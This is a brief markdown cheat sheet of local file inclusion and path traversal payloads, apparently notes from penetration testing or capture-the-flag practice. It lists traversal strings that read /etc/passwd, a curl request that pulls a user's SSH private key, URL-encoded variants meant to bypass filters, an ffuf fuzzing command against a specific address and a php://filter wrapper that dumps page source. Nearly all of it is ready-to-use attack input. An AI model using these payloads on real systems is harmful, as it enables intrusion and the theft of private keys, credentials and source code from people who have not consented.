### <span style="color:#50FA7B">cheat sheet</span>
```bash
../../../../etc/passwd

```
### <span style="color:#50FA7B">Example to read SSH key:</span>
- By default, SSH searches for `id_rsa`, `id_ecdsa`, `id_ecdsa_sk`, `id_ed25519`, `id_ed25519_sk`, and `id_dsa`
- Use URL encoding (%2e%2e%2f for ../) to bypass simple filters.
```bash
curl http://target/index.php?page=../../../../home/user/.ssh/id_rsa

#Encoded
http://$VICTIM_IP/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

# Automated Scanning
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.54.208:36613/index.php?view=FUZZ' -fs 1935

# Decoder Base64 in index file:
GET /index.php?page=php://filter/read=convert.base64-encode/resource=index HTTP/1.1

```

 